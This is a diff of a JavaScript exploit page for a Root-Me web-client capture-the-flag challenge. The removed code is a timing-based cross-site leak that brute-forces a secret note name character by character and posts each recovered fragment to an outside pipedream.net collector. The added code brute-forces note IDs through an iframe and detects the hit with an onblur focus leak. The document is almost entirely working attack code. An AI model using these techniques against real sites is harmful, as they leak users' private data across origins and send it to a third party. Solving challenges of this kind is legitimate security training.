@@ -1,55 +1,27 @@
-<script>
-let win = open("https://web-client-ch56.challenge01.root-me.org:58056/");
-setTimeout(() => win.close(), 1000);
+<body onblur="if(!window.found){window.found=true;alert('Found: '+position_of_current_id)}">
 
-function sendRequest(url) {
-    let xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
-    xhr.send(url);
+<script>
+var found = false;
+var noteId = 4000;
+
+var iframe = document.createElement('iframe');
+iframe.src = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/'+noteId+'#result';
+document.body.appendChild(iframe);
+iframe.onload = findId;
+
+
+function findId() {
+    if(!found){
+        iframe.src='https://web-client-ch56.challenge01.root-me.org:58056/notes/'+noteId+'#result';
+        timer = setTimeout(function(){ 
+           if(!found && noteId < 5000) {
+               noteId++; 
+           } 
+           findId();
+        },50);
+     } 
 }
-    
-async function attack() {
-    sendRequest("test=true")
-    let noteName = "";
-    let lowercase_letters = "azertyuiopmlkjhgfdsqwxcvbn"; //the flag is supposed to be composed of only lowercase letters
-    //suposing the flag is 32 characters long
-    let i = 0;
-    while (i < 10001 && noteName.length < 32) {
-        let j = 0;
-        while (i < 10001 && j < lowercase_letters.length) {
-            const l = lowercase_letters[j];
-            try {
-                await new Promise((resolve, reject) => {
-                    //fetch page
-                    var script = document.createElement('script');
-                    script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${i}/${noteName + l}`;
-                    document.body.appendChild(script);
-                    // Start the clock
-                    var start = performance.now();
-                    
-                    // When script loads, caculate the time it took to finish the request
-                    script.onload = () => {
-                        var time = performance.now() - start;
-                        if (time > 1500) {
-                            noteName += l;
-                            sendRequest(`note_name=${noteName}`);
-                        }
-                        resolve();
-                    }
-                    script.onerror = reject;
-                })
-                
-            } catch (error) {
-                i+=1;
-                j=0;
-                continue;
-            }
-            j++;
-        }
-    }      
-    sendRequest("result=false");
-}
-attack();
 
 
 </script>
+</body>
